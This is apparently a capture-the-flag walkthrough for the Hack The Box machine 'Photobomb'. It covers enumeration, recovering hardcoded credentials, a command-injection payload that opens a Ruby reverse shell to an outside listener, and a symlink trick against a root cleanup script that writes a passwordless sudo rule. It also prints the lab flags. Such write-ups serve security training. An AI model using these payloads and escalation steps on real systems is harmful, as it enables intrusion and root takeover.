## NMAP

The port scan shows only a web server and SSH access.

```
┌──(kali㉿kali)-[/media/sf_htb]
└─$ nmap -sT 10.129.35.175 -p 1-20000
Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-20 14:33 EST
Nmap scan report for 10.129.35.175
Host is up (0.054s latency).
Not shown: 19998 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.38 seconds
```

## GOBUSTER

No relevant sub-directory in the dir enumeration.

```
┌──(kali㉿kali)-[/media/sf_htb]
└─$ gobuster dir -u http://photobomb.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://photobomb.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2022/11/20 14:37:40 Starting gobuster in directory enumeration mode
===============================================================
/printer              (Status: 401) [Size: 188]
/printers             (Status: 401) [Size: 188]
/printerfriendly      (Status: 401) [Size: 188]
/printer_friendly     (Status: 401) [Size: 188]
/printer_icon         (Status: 401) [Size: 188]
/printer-icon         (Status: 401) [Size: 188]
/printer-friendly     (Status: 401) [Size: 188]
/printerFriendly      (Status: 401) [Size: 188]
/printersupplies      (Status: 401) [Size: 188]
/printer1             (Status: 401) [Size: 188]
/printer2             (Status: 401) [Size: 188]
/printericon          (Status: 401) [Size: 188]
/printer_2867         (Status: 401) [Size: 188]
/printer_securit      (Status: 401) [Size: 188]
/printer_drivers      (Status: 401) [Size: 188]
/printer_2            (Status: 401) [Size: 188]
/printer_list         (Status: 401) [Size: 188]
/printerdrivers       (Status: 401) [Size: 188]
/printer-ink          (Status: 401) [Size: 188]
Progress: 220468 / 220561 (99.96%)===============================================================
2022/11/20 14:54:37 Finished
===============================================================
                                                                 
```


The initial page has a basic web authentication.
The credentials are not known.

## Guess the password

In Firefox source code inspector there is a script in the page that is called:

view-source:http://photobomb.htb/photobomb.js

We can see that the credentials are available for those approaching using a tech support cookie. We can try the same credentials.

```javascript
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

User: `pH0t0`
Pass: `b0Mb!`

And we are in!

## Hack the params

The next page sends a simple POST form with an image to be downloaded. Inspecting the POST request we can see that there are three parameters: `photo`, `filetype` and `dimension`.

By removing the parameters, we can see a very verbose error log. On top of it we have:

```ruby
post '/printer' do
  photo = params[:photo]
  filetype = params[:filetype]
  dimensions = params[:dimensions]

  # handle inputs
  if photo.match(/\.{2}|\//)
    halt 500, 'Invalid photo.'
  end

  if !FileTest.exist?( "source_images/" + photo )
    halt 500, 'Source photo does not exist.'
  end
```

Which gives a hint on the processing of the photo parameter. Any attempt of passing a directory traversal will fail, unfortunately, as the check is pretty clear: no double dots or slashes allowed. 

Removing the dimension will show that valid values are always in a format like  `number x number` so no possible modifications.

Removing the filetype shows that filetype must BEGIN with `jpg` or `png` but it is not protected against additional characters. So we can try to fuzz this parameter.

Using the Burpsuite attacker on filetype, we notice that appending invalid paths chars like %00 to filetype will cause another error that finally reveals what happens!

```ruby
  when 'jpg'
    content_type 'image/jpeg'
  end

  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
  response['Content-Disposition'] = "attachment; filename=#{filename}"

  if !File.exists?('resized_images/' + filename)
    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
    puts "Executing: #{command}"
    system(command)
  else
    puts "File already exists."
  end
```

this means that the software is vulnerable to a command injection on filetype because the command is not sanitized when the path is invalid. We can use this vulnerabilty to open a reverse shell!

## Reverse Shell

Open a listener locally first:

```shell
nc -lvnp 3333
```

Then this value for filetype will work to start a reverse shell:

```shell
png; ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("10.10.14.87",3333))'
```

INote: it might need to be URL-encoded.

## User Flag

Once the reverse shell is done, just do `cat ~/user.txt` to obtain the flag: `e26c23d7d1c1ad21e4bc52f7592a4cff`

## ROOT

First quick test: `sudo -l` reveals that the user is capable of doing some root operations. Let's investigate that to see if there is any vulnerability.

## Find the bug

The available operation with no password is a script named `/opt/cleanup.sh` that, in particular, does the following:

```shell
# clean up log files
if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
then
  /bin/cat log/photobomb.log > log/photobomb.log.old
  /usr/bin/truncate -s0 log/photobomb.log
fi
```

This means that the script executes as root copying the content of `photobomb.log` into a backup copy. This does not check if the copy is an existing symlink, so we can replace it with a symlink and write to any root-owned file on the system.

```shell
ln -s target_root_owned_file photobomb.log.old
```

So the easiest thing to do is to inserta another line in `/etc/sudoers.d/photobomb` to give sudo rights to our user `wizard` without the need of a password. 

```shell
cd ~/photobomb/log
cat /etc/sudoers.d/photobomb > photobomb.log
echo "wizard ALL=(ALL) NOPASSWD:ALL" >> photobomb.log
sudo /opt/cleanup.sh
```

The cleanup script will copy the content of ``photobomb.log`` into `photobomb.log.old` that is now an existing symlink to the sudoers file.

## Root Flag

After this operation the `sudo su` command is available for the user `wizard` with no password.
The root flag is available in the root home: `f585990edef3f32e78f6ad8a83e39d1c`